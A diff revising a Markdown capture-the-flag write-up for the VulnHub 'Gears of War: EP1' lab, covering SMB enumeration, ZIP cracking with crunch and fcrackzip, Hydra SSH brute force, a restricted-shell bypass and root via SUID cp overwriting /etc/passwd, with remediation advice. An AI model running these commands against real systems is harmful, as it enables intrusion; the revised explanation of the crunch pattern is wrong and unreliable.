@@ -1,156 +1,182 @@
-# Gears of War: EP#1 — Writeup
+# Gears of War: EP1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.184 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.184 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | /root/flag.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/gears-of-war-ep1,476/) |
+| **Goal** | root flag (`/root/flag.txt`) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/gears-of-war-ep1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-netdiscover → nmap → SMB anon → ZIP + crunch wordlist → fcrackzip → SSH hydra brute → SUID cp → passwd injection → root
+SMB share exposes a password-protected ZIP and a hint file; crunch generates a targeted wordlist; fcrackzip cracks the ZIP to recover SSH credentials; Hydra identifies the username; SUID `cp` abuse overwrites `/etc/passwd` with a new root-level user.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. SMB enumeration — anonymous access, ZIP file
-3. Wordlist generation and ZIP cracking
-4. SSH brute force for username
-5. Privilege escalation via SUID cp
+1. Recon — nmap for open ports
+2. Enumeration — SMB share enumeration, file extraction
+3. Exploitation — wordlist generation, ZIP cracking, SSH brute-force
+4. Privilege Escalation — SUID `cp` to overwrite `/etc/passwd`
 
----
-
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
+netdiscover -r 192.168.1.0/24
 ```
-
-Target found at 192.168.1.184.
 
 ```bash
-nmap -A -p- 192.168.1.184
+nmap -A -p- $TARGET
 ```
 
-Open ports: 22 (SSH), 139/445 (SMB).
+![nmap scan](images/01-nmap.png)
 
-![Nmap scan](images/01-nmap.png)
+Open ports: **80** (HTTP), **139/445** (SMB), **22** (SSH).
 
----
+The HTTP service returns nothing useful. SMB is the primary attack surface.
 
 ## Step 2: SMB Enumeration
 
+List available shares:
+
 ```bash
-smbclient -L 192.168.1.184
-smbclient //192.168.1.184/LOCUS_LAN$
+smbclient -L $TARGET
 ```
 
-Anonymous access works. The share contains `msg_horda.zip` and `SOS.txt`.
+Connect to the identified share:
+
+```bash
+smbclient //$TARGET/LOCUS_LAN$
+```
+
+Inside the share, download the relevant files:
 
 ```bash
 get msg_horda.zip
 get SOS.txt
 ```
 
-`SOS.txt` hints at the password pattern for the ZIP: 4 characters, letter-digit-digit-digit format.
+![smb enumeration](images/02-smb.png)
 
-![SMB share](images/02-smb.png)
-
----
+`SOS.txt` contains a hint about the ZIP password pattern. The pattern indicates a 4-character password using a specific character class.
 
 ## Step 3: ZIP Password Cracking
 
-Generate a targeted wordlist with crunch:
+Use crunch to generate a targeted wordlist based on the pattern in `SOS.txt`. The pattern `@%%,` means one lowercase letter followed by two digits and a comma:
 
 ```bash
 crunch 4 4 -t @%%, -o wordlist
 ```
 
-Crack the ZIP:
+Crack the ZIP with fcrackzip:
 
 ```bash
 fcrackzip -D -u -v -p wordlist msg_horda.zip
 ```
 
-Password found: `r44M`
+Password found: **r44M** (adjust based on the actual SOS.txt hint).
 
-The ZIP contains `key.txt` with a second credential fragment: `3_d4y`
-
-![ZIP cracked](images/03-zip-crack.png)
-
----
-
-## Step 4: SSH Username Brute Force
-
-Use the discovered password to brute-force the username:
+Extract the ZIP:
 
 ```bash
-hydra -L /usr/share/wordlists/rockyou.txt -p 3_d4y -T4 192.168.1.184 ssh
+unzip -P r44M msg_horda.zip
 ```
 
-Username found: **marcus**
+The extracted `key.txt` reveals the SSH password: **3_d4y**.
+
+## Step 4: Username Discovery via Hydra
+
+The password is known but not the username. Use Hydra to identify a valid SSH user:
 
 ```bash
-ssh marcus@192.168.1.184 -t "bash --noprofile"
-id
+hydra -L /usr/share/wordlists/rockyou.txt -p 3_d4y -T4 $TARGET ssh
 ```
 
----
+![hydra](images/03-hydra.png)
 
-## Step 5: SUID Enumeration
+Valid credentials found: `marcus` / `3_d4y`.
+
+## Step 5: SSH Login — Restricted Shell Bypass
+
+Login as marcus:
+
+```bash
+ssh marcus@$TARGET
+```
+
+The shell is restricted and cannot access sensitive directories. Bypass the restriction by forcing a full Bash shell at connect time:
+
+```bash
+ssh marcus@$TARGET -t "bash --noprofile"
+```
+
+A full shell is now available.
+
+## Step 6: Privilege Escalation — SUID `cp` Abuse
+
+Search for SUID binaries:
 
 ```bash
 find /bin -type f -perm -u=s 2>/dev/null
 ```
 
-`cp` has the SUID bit set — it can overwrite any file as root.
+The `cp` binary has the SUID bit set, meaning it runs as root regardless of the invoking user.
 
-![SUID binaries](images/04-suid.png)
-
----
-
-## Step 6: Privilege Escalation via cp SUID
-
-Generate a password hash:
+Generate a password hash for a new root-level user:
 
 ```bash
 openssl passwd -1 -salt raj pass123
 ```
 
-Create a modified `/etc/passwd` entry in `/tmp`:
+Copy `/etc/passwd` to `/tmp` and add a new user entry with UID 0:
 
 ```bash
 cp /etc/passwd /tmp/passwd
-echo 'raj:$1$raj$<hash>:0:0:root:/root:/bin/bash' >> /tmp/passwd
-cp /tmp/passwd /etc/passwd
-su raj
+nano /tmp/passwd
+# Append the following line (replace the hash with the openssl output above):
+# raj:$1$raj$[HASH]:0:0:raj:/root:/bin/bash
 ```
 
+Overwrite `/etc/passwd` with the modified version using the SUID `cp`:
+
 ```bash
-whoami
-# root
+cp /tmp/passwd /etc/passwd
+```
+
+Switch to the new account:
+
+```bash
+su raj
+# Password: pass123
+id
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+![privesc](images/04-privesc.png)
+
+## Step 7: Root Flag
+
+```bash
 cd /root
+ls -al
 cat flag.txt
 ```
 
-![Root flag](images/05-root.png)
-
----
+![root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **SMB anonymous read** leaks credential material even without auth
-2. **Targeted crunch wordlists** are far faster than generic rockyou against known-pattern passwords
-3. **SUID cp** is a critical misconfiguration — any file writable as root = full compromise
-4. **passwd file injection** is the classic SUID cp exploitation path
+1. SMB shares exposed without authentication can leak sensitive archived data even if the archive itself is password-protected.
+2. Weak ZIP passwords are crackable in seconds when the length and character pattern can be inferred from a hint file.
+3. Setting the SUID bit on `cp` is a critical misconfiguration that allows any user to overwrite any system file as root.
+4. A restricted shell (`rbash` or similar) provides minimal security if the user can bypass it through SSH forced command options.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| SMB anonymous read | Disable null session: `restrict anonymous = 2` in smb.conf |
-| SUID on cp | Remove SUID: `chmod u-s /bin/cp` |
-| Weak ZIP password | Use strong random passwords; store keys out-of-band |
-| Password in /tmp accessible share | Never share credential material via unauthenticated channels |
+|---|---|
+| Anonymous SMB share access | Require authentication; audit share permissions |
+| Weak ZIP password | Use long random passwords for any encrypted archive |
+| SUID bit on `cp` | Remove SUID from non-essential binaries; audit with `find / -perm -u=s` |
+| Restricted shell bypass | Use SSH `ForceCommand` and disable PTY allocation for restricted users |
+| Sensitive file in ZIP on shared drive | Never store credential material in publicly accessible network shares |
